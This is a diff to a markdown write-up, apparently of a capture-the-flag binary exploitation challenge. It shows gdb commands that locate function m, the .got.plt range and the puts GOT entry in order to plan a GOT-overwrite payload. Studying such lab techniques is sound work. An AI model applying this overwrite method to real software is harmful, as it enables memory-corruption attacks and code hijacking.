@@ -17,22 +17,27 @@ We see that our flag is stored in a variable named c. We also see that there is 
 ### Building the payload
 
 Our goal is to do something like this
+
 **Char to overflow + adress of puts** and **Adress of m**
 
 first we need to find both adresses
+
 `(gdb) info functions `
 >0x080483c0  fgets@plt
 [...]
 0x080484f4  m
 
 **Getting GOT adress range :**
+
 ``(gdb) info files``
 >[...]
 0x08049908 - 0x08049938 is .got.plt
 
 **Let's find the function we want to overwrite, puts() :**
+
 ``(gdb) x/16wx 0x08049908``
-0x8049908 <_GLOBAL_OFFSET_TABLE_>:	0x0804983c	0x00000000	0x00000000	0x080483b6
+
+>0x8049908 <_GLOBAL_OFFSET_TABLE_>:	0x0804983c	0x00000000	0x00000000	0x080483b6
 [...]
 0x8049928 <puts@got.plt>:	0x08048406	0x08048416	0x08048426	0x08048436
 [...]
